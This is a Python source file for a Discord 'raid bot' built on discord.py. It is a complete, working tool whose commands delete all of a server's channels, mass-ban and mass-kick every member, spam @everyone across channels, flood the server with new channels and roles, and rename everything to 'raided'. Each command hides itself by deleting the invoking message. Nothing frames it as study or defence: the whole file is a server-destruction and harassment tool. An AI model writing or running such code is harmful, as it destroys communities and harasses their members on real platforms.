# language: Python 3.11+, file: raidbot.py
import discord
from discord.ext import commands
import asyncio
import os

TOKEN = os.getenv("TOKEN")
PREFIX = "!"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f"online as {bot.user} | {len(bot.guilds)} guilds")

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx, amount: int = 50):
    guild = ctx.guild
    await ctx.message.delete()
    for ch in list(guild.channels):
        try:
            await ch.delete()
        except:
            pass
    for i in range(amount):
        try:
            await guild.create_text_channel(f"raided-{i}")
        except:
            break
    print(f"nuke done on {guild.name}")

@bot.command()
@commands.has_permissions(administrator=True)
async def massrole(ctx, count: int = 30, *, name="raided"):
    guild = ctx.guild
    await ctx.message.delete()
    roles = []
    for i in range(count):
        try:
            r = await guild.create_role(name=f"{name}-{i}", colour=discord.Colour.random())
            roles.append(r)
        except:
            break
    for member in guild.members:
        for r in roles:
            try:
                await member.add_roles(r)
            except:
                pass
    print(f"massrole done on {guild.name}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def massban(ctx, reason="raided"):
    guild = ctx.guild
    await ctx.message.delete()
    for member in list(guild.members):
        if member == ctx.author or member == bot.user:
            continue
        try:
            await member.ban(reason=reason, delete_message_days=0)
        except:
            pass
    print(f"massban done on {guild.name}")

@bot.command()
@commands.has_permissions(kick_members=True)
async def masskick(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    for member in list(guild.members):
        if member == ctx.author or member == bot.user:
            continue
        try:
            await member.kick(reason="raided")
        except:
            pass
    print(f"masskick done on {guild.name}")

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx, times: int = 20, *, message="@everyone raided"):
    await ctx.message.delete()
    for channel in ctx.guild.text_channels:
        for _ in range(times):
            try:
                await channel.send(message)
            except:
                break
            await asyncio.sleep(0.4)
    print(f"spam done on {ctx.guild.name}")

@bot.command()
@commands.has_permissions(administrator=True)
async def flood(ctx, amount: int = 40, *, name="raid"):
    guild = ctx.guild
    await ctx.message.delete()
    for i in range(amount):
        try:
            ch = await guild.create_text_channel(f"{name}-{i}")
            await ch.send("@everyone")
        except:
            break
    print(f"flood done on {guild.name}")

@bot.command()
@commands.has_permissions(administrator=True)
async def renameall(ctx, *, new_name="raided"):
    guild = ctx.guild
    await ctx.message.delete()
    for ch in guild.channels:
        try:
            await ch.edit(name=new_name)
        except:
            pass
    for role in guild.roles:
        if role.is_default() or role.managed:
            continue
        try:
            await role.edit(name=new_name)
        except:
            pass
    print(f"renameall done on {guild.name}")

@bot.command()
@commands.has_permissions(administrator=True)
async def leave(ctx):
    await ctx.message.delete()
    await ctx.guild.leave()

bot.run(TOKEN)